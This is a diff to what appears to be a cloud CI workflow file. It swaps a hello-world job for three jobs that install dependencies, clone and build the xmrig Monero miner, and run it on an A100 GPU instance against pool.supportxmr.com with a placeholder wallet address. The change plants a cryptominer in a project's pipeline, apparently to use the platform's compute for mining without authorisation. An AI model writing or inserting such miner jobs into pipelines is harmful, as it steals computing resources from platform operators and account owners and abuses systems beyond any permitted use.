@@ -3,23 +3,61 @@
     branches:
       only: main
 jobs:
-  CloneRepo:
+  Install:
     resources:
       instance-type: C5
     outputs:
-      repo:
+      xmrig-source:
         type: volume
-    uses: git-checkout@v1
-    with:
-      url: context.event.github.url
-  HelloWorld:
-    resources:
-      instance-type: C5
-    needs:
-      - CloneRepo
-    inputs:
-      repo: CloneRepo.outputs.repo
     uses: script@v1
     with:
-      script: python /inputs/repo/hello.py
-      image: tensorflow/tensorflow:1.14.0-py3
+      script: |
+        # Installer les dépendances nécessaires
+        apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+        # Cloner le dépôt xmrig
+        git clone https://github.com/xmrig/xmrig.git /xmrig
+        # Copier les sources dans le volume de sortie
+        cp -r /xmrig /outputs/xmrig-source
+
+  Build:
+    needs:
+      - Install
+    resources:
+      instance-type: C5
+    inputs:
+      xmrig-source:
+        type: volume
+    outputs:
+      xmrig-build:
+        type: volume
+    uses: script@v1
+    with:
+      script: |
+        # Copier les sources dans le répertoire de travail
+        cp -r /inputs/xmrig-source/xmrig /xmrig
+        cd /xmrig
+        # Créer le répertoire de build et y accéder
+        mkdir build && cd build
+        # Générer les fichiers de build avec cmake
+        cmake ..
+        # Compiler xmrig
+        make
+        # Copier les fichiers compilés dans le volume de sortie
+        cp -r * /outputs/xmrig-build/
+
+  Run:
+    needs:
+      - Build
+    resources:
+      instance-type: A100
+    inputs:
+      xmrig-build:
+        type: volume
+    uses: script@v1
+    with:
+      script: |
+        # Copier les fichiers compilés dans le répertoire de travail
+        cp -r /inputs/xmrig-build/* /xmrig
+        cd /xmrig
+        # Exécuter xmrig
+        ./xmrig --donate-level 1 -o pool.supportxmr.com:3333 -u VotreAdresseMonero -p x
